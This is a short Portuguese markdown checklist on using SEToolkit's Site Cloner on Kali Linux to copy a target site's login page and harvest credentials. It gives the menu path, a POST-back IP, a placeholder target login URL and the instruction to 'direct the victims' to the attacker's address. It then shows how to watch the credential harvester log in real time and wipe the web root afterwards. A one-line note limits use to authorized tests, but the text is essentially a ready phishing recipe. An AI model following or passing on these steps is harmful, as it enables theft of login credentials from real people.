# 📖 Site Cloner com SEToolkit no Kali Linux

---

## ⚙️ Requisitos

- [ ] **Kali Linux** (já vem com SEToolkit instalado)  
- [ ] Acesso **root** ou sudo  
- [ ] Rede configurada (LAN ou túnel via ngrok)

---

## 🚀 Passo a Passo

- [ ] **Abra o terminal e vire root**  
    sudo su
- [ ] **Inicie o SEToolkit**  
    setoolkit
- [ ] **Selecione os módulos**  
    1) Social-Engineering Attacks  
    2) Website Attack Vectors  
    1) Web-Based Attack Vectors  
    2) Site Cloner
- [ ] **Configure o “POST Back”**  
    Enter the IP address for the POST Back: `<SEU_IP>`
- [ ] **Cole a URL alvo**  
    Enter the url to clone: `http://exemplo.com/login`
- [ ] **Aguarde o clone**  
    Arquivos clonados → `/var/www/html/`  
    Apache iniciado automaticamente
- [ ] **Direcione as vítimas**  
    `http://<SEU_IP>/`
- [ ] **Monitore credenciais em tempo real**  
    tail -f /root/.setoolkit/logs/credentialharvester.log
- [ ] **Finalização & limpeza**  
    systemctl stop apache2  
    rm -rf /var/www/html/*

---

## 📝 Observações

- ⚖️ **Uso legal**: só em testes autorizados!  
- 🔒 **HTTPS** gerará aviso de certificado autoassinado.  
- 🔧 Personalize o clone editando `/var/www/html/` conforme necessidade.  
